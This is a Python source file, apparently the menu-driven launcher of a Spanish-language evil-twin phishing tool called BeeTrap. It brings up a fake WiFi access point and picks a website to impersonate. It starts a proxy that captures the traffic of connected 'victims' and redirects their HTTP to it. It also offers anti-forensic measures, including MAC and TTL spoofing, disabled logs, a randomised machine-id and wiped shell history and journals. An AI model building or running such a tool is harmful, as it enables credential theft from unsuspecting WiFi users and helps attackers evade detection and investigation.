import os
import sys
import time
import subprocess
import threading


def _progreso(paso, total, texto):
    ancho = 20
    llenos = int(paso / total * ancho)
    barra = "[" + "#" * llenos + "." * (ancho - llenos) + "]"
    # Usar nueva linea cada vez para evitar que se pisen otros prints
    sys.stdout.write("  " + barra + " " + str(paso) + "/" + str(total) + " " + texto + "\n")
    sys.stdout.flush()

from . import access_point as ap
from . import firewall as fw
from . import stealth as st
from .config import ProxyConfig, PRESETS
from .proxy import EvilTwinProxy


BANNER = r"""
  ▄▄▄▄▄▄                        ▄▄▄▄▄▄▄▄
  ██▀▀▀▀██                      ▀▀▀██▀▀▀
  ██    ██   ▄████▄    ▄████▄      ██      ██▄████   ▄█████▄  ██▄███▄
  ███████   ██▄▄▄▄██  ██▄▄▄▄██     ██      ██▀       ▀ ▄▄▄██  ██▀  ▀██
  ██    ██  ██▀▀▀▀▀▀  ██▀▀▀▀▀▀     ██      ██       ▄██▀▀▀██  ██    ██
  ██▄▄▄▄██  ▀██▄▄▄▄█  ▀██▄▄▄▄█     ██      ██       ██▄▄▄███  ███▄▄██▀
  ▀▀▀▀▀▀▀     ▀▀▀▀▀     ▀▀▀▀▀      ▀▀      ▀▀        ▀▀▀▀ ▀▀  ██ ▀▀▀
                                                              ██

                     ...vvvv)))))).
                     /~~\               ,,,c(((((((((((((((((/
                    /~~c \.         .vv)))))))))))))))))))\``
                        G_G__   ,,(((KKKK//////////////'
                      ,Z~__ '@,gW@@AKXX~MW,gmmmz==m_.
                     iP,dW@!,A@@@@@@@@@@@@@@@A` ,W@@A\c
                     ]b_.__zf !P~@@@@@*P~b.~+=m@@@*~ g@Ws.
                        ~`    ,2W2m. '\[ ['~~c'M7 _gW@@A`'s
                          v=XX)====Y-  [ [    \c/*@@@*~ g@@i
                         /v~           !.!.     '\c7+sg@@@@@s.
                        //              'c'c       '\c7*X7~~~~
                       ]/                 ~=Xm_       '~=(Gm_.

  Creator: BloodMoney605
"""


def _separador():
    print("=" * 60)


def _centrado(texto):
    print(f"  {texto}".center(60))


def _input(texto, default=None):
    if default:
        prompt = f"  {texto} [{default}]: "
    else:
        prompt = f"  {texto}: "
    try:
        val = input(prompt).strip()
    except (EOFError, KeyboardInterrupt):
        print("\n  cancelado")
        sys.exit(0)
    return val if val else default


def _numero(texto, default, minimo, maximo):
    while True:
        val = _input(texto, str(default))
        try:
            n = int(val)
            if minimo <= n <= maximo:
                return n
            print(f"  [!] numero entre {minimo} y {maximo}")
        except ValueError:
            print(f"  [!] numero entre {minimo} y {maximo}")


def _interfaces_disponibles():
    r = subprocess.run("iw dev | grep Interface", shell=True, capture_output=True, text=True)
    interfaces = []
    if r.returncode == 0:
        for linea in r.stdout.strip().split("\n"):
            parts = linea.split()
            if len(parts) >= 2:
                interfaces.append(parts[-1])
    for c in ["wlan0", "wlan1", "wlp2s0", "wlp3s0"]:
        if os.path.exists(f"/sys/class/net/{c}") and c not in interfaces:
            interfaces.append(c)
    return interfaces


def menu_target():
    print()
    _separador()
    _centrado("ELEGIR PAGINA A SUPLANTAR")
    _separador()
    print()

    items = list(PRESETS.items())
    for i, (key, p) in enumerate(items, 1):
        print(f"  [{i}] {p['name']}")
        print(f"      {p['url']}")
        print()
    texto_opcion = "URL personalizada no disponible"
    tachado = "\u0336".join(list(texto_opcion)) + "\u0336"
    print(f"  [\u0336{len(items) + 1}\u0336] {tachado}")
    print()

    c = _numero("Opcion", 1, 1, len(items) + 1)

    if c <= len(items):
        return items[c - 1][1]
    print()
    print("  URL personalizada no disponible en esta version.")
    print("  En la proxima actualización intentaremos que este disponible.")
    print()
    sys.exit(0)


def menu_seguridad():
    print()
    _separador()
    _centrado("MEDIDAS DE SEGURIDAD")
    _separador()
    print()

    opciones = [
        ("Medidas basicas", "MAC aleatoria + bloqueo lateral + aislar interfaz + sin logs + namespace"),
        ("Identidad y ubicacion", "Subred aleatoria + zona horaria falsa + hostname cambiado"),
        ("Huella digital de red", "TTL spoof + TCP timestamps off + IPv6 off + DHCP fingerprint random"),
        ("Contra-analisis forense", "Core dumps off + machine-id aleatorio + /tmp tmpfs + limpiar historial"),
    ]

    for i, (nombre, desc) in enumerate(opciones, 1):
        print(f"  [{i}] {nombre}")
        print(f"      {desc}")
        print()

    print(f"  [5] Todas las medidas")
    print(f"  [6] Ninguna medida")
    print(f"  [7] ? Explicar cada opcion")
    print()

    while True:
        c = _numero("Elegir", 5, 1, 7)
        if c == 7:
            print()
            print("  1 - Basicas: cambia la MAC, evita que clientes se vean entre si,")
            print("      aísla la interfaz, desactiva logs del sistema y crea un")
            print("      namespace aislado.")
            print()
            print("  2 - Identidad: usa una subred IP aleatoria distinta cada vez,")
            print("      cambia la zona horaria del sistema y el hostname.")
            print()
            print("  3 - Huella digital: modifica el TTL de los paquetes, desactiva")
            print("      TCP timestamps, apaga IPv6 y randomiza el vendor class DHCP.")
            print()
            print("  4 - Forense: desactiva core dumps del kernel, randomiza el")
            print("      machine-id, monta /tmp y /var/log en RAM y al salir borra")
            print("      bash_history, journalctl y dmesg.")
            print()
            continue
        if c == 5:
            print("  seleccionadas: todas")
            return [1, 2, 3, 4]
        if c == 6:
            print("  ninguna")
            return []
        if 1 <= c <= 4:
            print(f"  seleccionada: {opciones[c-1][0]}")
            return [c]


def menu_interfaz():
    print()
    _separador()
    _centrado("INTERFAZ WiFi")
    _separador()
    print()

    interfaces = _interfaces_disponibles()

    if not interfaces:
        iface = _input("Especificar interfaz manualmente")
        if not iface:
            sys.exit(1)
        return iface

    print("  Interfaces detectadas:")
    print()
    for i, iface in enumerate(interfaces, 1):
        print(f"  [{i}] {iface}")
        print()

    while True:
        c = _numero("Elegir interfaz", 1, 1, len(interfaces))
        if 1 <= c <= len(interfaces):
            return interfaces[c - 1]


def menu_ssid():
    print()
    _separador()
    _centrado("NOMBRE DEL WIFI FALSO")
    _separador()
    print()
    print("  Nombre que veran las victimas en redes WiFi.")
    print()

    ssid = _input("Nombre de la red (SSID)", "Free WiFi")
    if not ssid:
        print("  [!] SSID obligatorio")
        sys.exit(1)
    return ssid


def modo_honeypot(target, ssid, iface, seguridad, port=8080, capture_dir="./captures"):
    ap.es_root()
    ap._dependencias()

    restauracion = {}

    if 2 in seguridad:
        net = st.subred_aleatoria()
        print("  [2] Identidad: subred " + net["gw"] + "/24")
        st.zona_horaria_falsa(guardar_en=restauracion.setdefault("tz", []))
        st.hostname_aleatorio(guardar_en=restauracion.setdefault("hostname", []))
    else:
        net = None

    dhcp_lease = st.dhcp_lease_variable() if 3 in seguridad else "12h"
    dhcp_vendor = st.dhcp_vendor_random() if 3 in seguridad else None

    portal_host = ssid.strip().replace(" ", "").replace("_", "")[:20]
    if not portal_host:
        portal_host = "wifi"

    ap_instancia = ap.AccessPoint(
        iface, ssid, port,
        cambiar_mac=1 in seguridad,
        deshabilitar_logs=1 in seguridad,
        subnet=net,
        dhcp_lease=dhcp_lease,
        dhcp_vendor=dhcp_vendor,
    )
    ap_instancia.portal_host = portal_host

    ap_instancia.preparar()
    ap_instancia.iniciar()

    proxy = EvilTwinProxy(ProxyConfig(
        target_domain=target["url"],
        listen_host="0.0.0.0",
        listen_port=port,
        capture_path=capture_dir,
        extra_domains=target.get("extra", []),
        ssid=ssid,
    ))
    t = threading.Thread(target=proxy.arrancar, daemon=True)
    t.start()
    time.sleep(1)

    fw.redirect_http_to_proxy(iface, port)

    if 1 in seguridad:
        print("  [1] Basicas: MAC + lateral + aislamiento + logging + namespace")
        fw.block_client_to_client(iface)
        fw.isolate_interface(iface)

    if 3 in seguridad:
        print("  [3] Huella digital: TTL spoof + TCP timestamps off + IPv6 off")
        st.ttl_spoof(iface)
        st.tcp_timestamps_off()
        st.ipv6_off()

    if 4 in seguridad:
        print("  [4] Forense: core dumps off + machine-id + tmpfs")
        st.core_dumps_off()
        st.machine_id_random(guardar_en=restauracion.setdefault("machine_id", []))
        st.tmpfs_montar()

    print()
    _separador()
    print("  BeeTrap ACTIVO")
    print("  SSID: " + ssid)
    print("  Target: " + target["name"])
    print("  Ctrl+C para detener (restaura todo)")
    _separador()
    print()

    try:
        while True:
            time.sleep(5)
            clientes = ap_instancia.clientes_conectados()
            if clientes:
                print("  [" + str(len(clientes)) + " cliente(s) conectado(s)]")
                for c in clientes:
                    print("    " + c["ip"] + "  " + c["mac"] + "  " + c["hostname"])
    except KeyboardInterrupt:
        pass
    finally:
        print()
        print("  Restaurando sistema...")
        pasos = []
        # armar lista de tareas segun medidas activas
        pasos.append(("deteniendo proxy", lambda: proxy.detener(silencioso=True)))
        pasos.append(("deteniendo AP", lambda: ap_instancia.detener()))
        pasos.append(("limpiando iptables", lambda: fw.flush_all()))
        pasos.append(("restaurando MAC", lambda: ap_instancia.restaurar_mac()))
        pasos.append(("restaurando interfaz", lambda: ap_instancia.restaurar_interfaz()))
        if 3 in seguridad:
            pasos.append(("restaurando IPv6", lambda: st.restaurar_ipv6()))
        if 2 in seguridad:
            tz_val = (restauracion.get("tz") or [""])[0]
            host_val = (restauracion.get("hostname") or [""])[0]
            pasos.append(("restaurando zona horaria", lambda v=tz_val: st.restaurar_zona_horaria(v)))
            pasos.append(("restaurando hostname", lambda v=host_val: st.restaurar_hostname(v)))
        if 4 in seguridad:
            mid_val = (restauracion.get("machine_id") or [""])[0]
            pasos.append(("restaurando machine-id", lambda v=mid_val: st.restaurar_machine_id(v)))
            pasos.append(("limpiando historial", lambda: st.limpiar_historial()))

        total = len(pasos)
        for i, (texto, tarea) in enumerate(pasos, 1):
            _progreso(i, total, texto)
            sys.stdout.flush()
            try:
                tarea()
            except Exception:
                pass
        sys.stdout.write("  [" + "#" * 20 + "] " + str(total) + "/" + str(total) + " completo\n")
        sys.stdout.flush()
        print("  Listo.\n")


def main():
    os.system("clear" if os.name != "nt" else "cls")
    print(BANNER)
    time.sleep(1.5)

    target = menu_target()
    capture_dir = _input("Directorio de capturas", "./captures") or "./captures"
    puerto_str = _input("Puerto del proxy", "8080")
    try:
        puerto = int(puerto_str)
    except ValueError:
        puerto = 8080

    ssid = menu_ssid()
    iface = menu_interfaz()
    seguridad = menu_seguridad()

    print()
    _separador()
    _centrado("RESUMEN DE CONFIGURACION")
    _separador()
    print()
    print(f"  SSID:        {ssid}")
    print(f"  Target:      {target['name']}")
    print(f"  Interfaz:    {iface}")
    print(f"  Puerto:      {puerto}")
    print(f"  Seguridad:   {len(seguridad)} medida(s)")
    print()

    if _input("Iniciar?", "s").lower() not in ("s", "y", "si", "yes"):
        print("  cancelado")
        sys.exit(0)

    modo_honeypot(target, ssid, iface, seguridad, puerto, capture_dir)


if __name__ == "__main__":
    main()
